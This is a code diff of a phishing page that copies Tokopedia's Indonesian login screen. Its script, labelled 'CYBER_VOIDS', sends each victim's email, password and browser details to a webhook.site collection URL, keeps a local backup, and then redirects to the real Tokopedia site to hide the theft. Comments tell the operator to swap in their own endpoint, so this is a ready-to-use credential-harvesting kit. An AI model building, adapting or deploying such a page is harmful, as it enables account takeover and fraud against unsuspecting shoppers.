@@ -6,17 +6,23 @@
     <title>Tokopedia - Masuk ke Akun Anda</title>
     <link rel="icon" href="https://ecs7.tokopedia.net/assets-tokopoints-email/images/favicon.ico">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; }
+        body { background-color: #f8f9fa; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .container { width: 100%; max-width: 400px; }
-        .logo { text-align: center; margin-bottom: 20px; }
-        .logo img { width: 150px; }
-        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        h1 { font-size: 20px; color: #333; margin-bottom: 5px; }
-        .subtitle { color: #666; font-size: 13px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
-        button { width: 100%; background: #42b549; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; margin-top: 10px; }
-        .footer { text-align: center; font-size: 11px; color: #999; margin-top: 20px; }
+        .logo { text-align: center; margin-bottom: 25px; }
+        .logo img { width: 170px; height: auto; }
+        .login-card { background: white; border-radius: 12px; padding: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #e8e8e8; }
+        h1 { font-size: 22px; color: #333; margin-bottom: 8px; font-weight: 600; }
+        .subtitle { color: #666; font-size: 13px; margin-bottom: 22px; }
+        .form-group { margin-bottom: 18px; }
+        label { display: block; font-size: 13px; color: #333; margin-bottom: 6px; font-weight: 500; }
+        input { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; transition: border 0.2s; }
+        input:focus { outline: none; border-color: #42b549; box-shadow: 0 0 0 2px rgba(66, 181, 73, 0.1); }
+        .btn-login { width: 100%; background: #42b549; color: white; border: none; border-radius: 8px; padding: 14px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; margin-top: 5px; }
+        .btn-login:hover { background: #3aa041; }
+        .footer { text-align: center; margin-top: 22px; font-size: 11px; color: #999; line-height: 1.5; }
+        .hidden { display: none; }
+        .loading { text-align: center; padding: 10px; color: #42b549; font-size: 13px; }
     </style>
 </head>
 <body>
@@ -24,58 +30,108 @@
         <div class="logo">
             <img src="https://ecs7.tokopedia.net/assets-tokopoints-email/images/logo-tokopedia.png" alt="Tokopedia">
         </div>
-        <div class="card">
+        <div class="login-card">
             <h1>Masuk ke Akun Anda</h1>
             <p class="subtitle">Selamat datang kembali! Masuk dengan akun Tokopedia Anda.</p>
             
             <form id="loginForm">
-                <input type="text" id="email" placeholder="Email / Nomor HP" required>
-                <input type="password" id="password" placeholder="Password" required>
-                <button type="submit">MASUK</button>
+                <div class="form-group">
+                    <label for="email">Email / Nomor HP</label>
+                    <input type="text" id="email" name="email" placeholder="contoh: nama@email.com" required autocomplete="email">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Masukkan password" required autocomplete="current-password">
+                </div>
+                
+                <button type="submit" class="btn-login" id="submitBtn">MASUK</button>
             </form>
             
+            <div id="loading" class="hidden loading">
+                <p>🔐 Memverifikasi informasi Anda...</p>
+            </div>
+            
             <div class="footer">
-                Dengan masuk, Anda menyetujui Syarat & Ketentuan Tokopedia.
+                Dengan masuk, Anda menyetujui <a href="#" style="color: #42b549; text-decoration: none;">Syarat & Ketentuan</a> serta <a href="#" style="color: #42b549; text-decoration: none;">Kebijakan Privasi</a> Tokopedia.
             </div>
         </div>
     </div>
 
+    <!-- 🔥 CYBER_VOIDS SCRIPT START -->
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
             
-            // Simpan ke localStorage HP (backup)
-            localStorage.setItem('last_try', JSON.stringify({
-                email: email,
-                time: new Date().toLocaleString()
-            }));
+            // UI Loading
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Memproses...';
+            loading.classList.remove('hidden');
             
-            // Kirim ke Telegram (ganti dengan bot Token kamu)
-            var botToken = "YOUR_BOT_TOKEN";
-            var chatId = "YOUR_CHAT_ID";
-            var message = "📧 EMAIL: " + email + "%0A" +
-                         "🔒 PASS: " + password + "%0A" +
-                         "📱 Device: " + navigator.userAgent;
+            // 1. LOG KE CONSOLE (Debug)
+            console.log('🔥 CYBER_VOIDS - DATA DICAPTURE');
+            console.log('📧 Email:', email);
+            console.log('🔐 Password:', password);
+            console.log('🌐 User Agent:', navigator.userAgent);
             
-            // Pakai webhook.site jika tidak punya bot Telegram
-            fetch('https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({email: email, password: password})
-            });
+            // 2. KIRIM KE WEBHOOK.SITE (GANTI URL INI!)
+            const WEBHOOK_URL = 'https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3'; // ← GANTI!
             
-            // Tampilkan loading
-            document.querySelector('button').innerHTML = 'Verifikasi...';
-            document.querySelector('button').disabled = true;
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        source: 'tokopedia-phishing'
+                    })
+                });
+                
+                console.log('✅ Data berhasil dikirim ke webhook');
+                
+            } catch (error) {
+                console.error('❌ Gagal mengirim data:', error);
+            }
             
-            // Redirect setelah 2 detik
-            setTimeout(function() {
-                window.location.href = 'https://www.tokopedia.com';
-            }, 2000);
+            // 3. SIMPAN KE LOCALSTORAGE (Backup)
+            try {
+                const logs = JSON.parse(localStorage.getItem('login_logs') || '[]');
+                logs.push({
+                    email: email,
+                    time: new Date().toLocaleString(),
+                    device: navigator.userAgent.slice(0, 50)
+                });
+                localStorage.setItem('login_logs', JSON.stringify(logs.slice(-10))); // Simpan 10 terakhir
+            } catch (e) {
+                console.log('⚠️ Gagal simpan ke localStorage');
+            }
+            
+            // 4. REDIRECT KE TOKOPEDIA (Setelah 1.5 detik)
+            setTimeout(() => {
+                window.location.href = 'https://www.tokopedia.com/?ref=login_success';
+            }, 1500);
+        });
+        
+        // Auto-reset form jika user kembali
+        window.addEventListener('pageshow', function(event) {
+            if (event.persisted) {
+                document.getElementById('loginForm').reset();
+                document.getElementById('submitBtn').disabled = false;
+                document.getElementById('submitBtn').textContent = 'MASUK';
+                document.getElementById('loading').classList.add('hidden');
+            }
         });
     </script>
+    <!-- 🔥 CYBER_VOIDS SCRIPT END -->
 </body>
 </html>
